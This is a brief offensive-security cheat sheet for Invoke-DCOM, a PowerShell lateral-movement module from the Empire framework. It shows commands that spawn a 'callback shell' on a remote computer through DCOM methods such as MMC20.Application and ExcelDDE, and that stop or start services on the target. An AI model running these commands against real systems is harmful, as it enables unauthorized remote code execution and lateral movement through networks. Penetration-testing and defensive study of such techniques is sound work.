# Invoke-DCOM

- Spawn the callback shell.

```
PS C:\> Import-Module Invoke-DCOM.ps1

PS C:\> Invoke-DCOM -ComputerName <IP> -Method <MMC20.Application | ShellWindows | ShellBrowserWindow | ExcelDDE> -Command C:\path\to\remote\shell.exe
```

- Modify the service.

```
PS C:\> Invoke-DCOM -ComputerName <IP> -Method <ServiceCheck | MinimizeAll | ServiceStop | ServiceStart> "<service_name>"
```

---
## References

- [Invoke-DCOM](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/lateral_movement/Invoke-DCOM.ps1)